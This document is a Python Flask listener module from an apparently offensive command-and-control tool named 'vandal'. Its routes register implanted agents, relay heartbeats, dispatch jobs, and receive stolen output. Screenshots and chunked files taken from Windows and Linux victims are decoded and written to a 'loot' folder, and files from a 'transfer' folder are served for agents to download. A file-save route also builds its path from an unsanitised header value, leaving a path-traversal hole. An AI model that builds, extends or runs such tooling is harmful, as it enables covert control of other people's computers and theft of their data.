from vandal_settings import PORT, SECRET_KEY
from flask import Flask, abort,app,request,jsonify, send_file, send_from_directory
from colorama import init, Fore
from prettytable import PrettyTable
import requests,base64,datetime
from .__agents import list_agents
from .__menu import *
from .__sockets import *

chunks = {}
proxy_statuses = {}
LOOT_FOLDER = './loot'  # Adjust as needed
TRANSFER_FOLDER = './transfer'  # Adjust as needed

def initialize_routes(app):
    @app.route('/tag', methods=['POST'])
    def forward_request():
        # I have no idea what to do here just yet, eventually want to pull from Global
        #secret_key = "PASSWORD" 
        # Leaving this here for now (10/11/2023)
        #expected_encoded_key = base64.b64encode(secret_key.encode()).decode()
        received_key = request.headers.get('X-Secret-Key')

        if received_key == SECRET_KEY:
            headers = {
                'X-Secret-Key': received_key
            }
            # This line needs to be updated with argument passed in server, else default value
            response = requests.post(f'http://127.0.0.1:{PORT}/tag', json=request.json, headers=headers, verify=False)

            # If the registration was successful, print the agent details
            # Would like to move this to a table format 
            if response.status_code == 200:
                data = response.json()
                list_agents()
                #print(Fore.GREEN + "\t[!] New agent registered!")
                #print(Fore.YELLOW + f"\t\t\t[+] ID: {data['agent_id']}")
                print("\n")
                print(Fore.YELLOW + "vandal$ > " + Fore.RESET, end=" ")
    

            return response.content, response.status_code
        else:
            return "Not Authenticated", 401

    @app.route('/beat', methods=['GET'])
    def forward_heartbeat():
        received_key = request.headers.get('X-Secret-Key')
        #secret_key = SECRET_KEY  

        if received_key == SECRET_KEY:
            agent_identifier = request.headers.get('X-Agent-ID')
            sleep_duration = request.headers.get('X-Sleep-Duration')
            headers = {'X-Secret-Key': received_key,
                       'X-Agent-ID' : agent_identifier,
                       'X-Sleep-Duration' : sleep_duration }
            response = requests.get(f'http://127.0.0.1:{PORT}/beat', headers=headers, verify=False)  # Adjust endpoint if necessary
            return response.content, response.status_code
        else:
            return "Not Authenticated", 401

    @app.route('/jobs/<agent_id>', methods=['GET'])
    def proxy_get_jobs(agent_id):
        headers = {
            # I have no idea what to do here just yet, eventually want to pull from Global
            'X-Secret-Key': SECRET_KEY
        }

        # Since the server is hosting the endpoints we need to forward the request
        response = requests.get(f"http://127.0.0.1:{PORT}/jobs/{agent_id}", headers=headers, verify=False)

        return response.content, response.status_code, dict(response.headers)

    @app.route('/job_result', methods=['POST'])
    def job_result():

        if request.headers.get("X-Secret-Key") != SECRET_KEY:
            return jsonify({"message": "Invalid secret key!"}), 401

        data = request.json
        if not data or not data.get('job_id') or not data.get('output'):
            return jsonify({"message": "Missing or invalid request data!"}), 400

        job_id = data.get('job_id')
        output = data.get('output')
        # This is where things get interesting
        # This flag will be None if not present
        is_final_chunk = data.get('is_final_chunk', None) 

        # Handle Linux screenshot 
        if 'screenshot' in data:
            img_data = base64.b64decode(data['screenshot'])
            current_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            filename = f"loot/screenshot_{job_id}_{current_time}.png"
            with open(filename, 'wb') as f:
                f.write(img_data)
            output += "\nScreenshot saved to " + filename

        # Handle Windows screenshot
        # Data is chunked into pieces and stitched back together like Frankenstein
        if is_final_chunk is not None:
            if job_id not in chunks:
                chunks[job_id] = []

            # Need a place to store the body
            chunks[job_id].append(output) 
            # Debug statment below (remove before release - 10/11/2023) 
            #print("Received chunk:", output)

            # When all set and done
            if is_final_chunk:
                complete_data = ''.join(chunks[job_id])
                # Debug statment below (remove before release - 10/11/2023)
                #print("Assembled data:", complete_data)
                img_data = base64.b64decode(complete_data)
                current_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                filename = f"loot/data_{job_id}_{current_time}.file"
                with open(filename, 'wb') as f:
                    f.write(img_data)
                # Wipe the chunks for this job    
                del chunks[job_id]  

        # Otherwise we handle the output like a  boss
        else:
            print(Fore.YELLOW + f"{output}" + Fore.RESET)
            
        response_message = "Job result received successfully"
        return jsonify({"message": response_message})

    @app.route('/shutdown', methods=['POST'])
    def shutdown():
        """Shutdown the Listener"""
        shutdown_server = request.environ.get('werkzeug.server.shutdown')
        if shutdown_server is None:
            raise RuntimeError('Not running the development server')
        shutdown_server()
        return 'Server shutting down...'

        
    @app.route('/download_file', methods=['POST'])
    def download_file():
        try:
            raw_data = request.data
            # Here, we'll assume you sent the filename as a header (X-Filename). Adjust as needed.
            filename = request.headers.get('X-Filename')
            if not filename:
                raise ValueError("Filename not provided")

            save_path = os.path.join(LOOT_FOLDER, filename)
            with open(save_path, 'wb') as f:
                f.write(raw_data)
        
            return jsonify({'message': 'File downloaded successfully!'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 400
        

    from werkzeug.utils import secure_filename

    @app.route('/upload_file/<filename>', methods=['GET'])
    def upload_file(filename):
        try:
            safe_filename = secure_filename(filename)
            absolute_path = os.path.abspath(os.path.join(TRANSFER_FOLDER, safe_filename))

            # Print or log for debugging
            print(f"Requested filename: {filename}")
            print(f"Absolute path to serve: {absolute_path}")

            # Check if file exists before trying to send it
            if not os.path.exists(absolute_path):
                return jsonify({'error': 'File not found'}), 404

            return send_file(absolute_path, as_attachment=True, download_name=safe_filename)
        except Exception as e:
            print(f"Server Error: {str(e)}")  # Print or log the error
            return jsonify({'error': str(e)}), 500






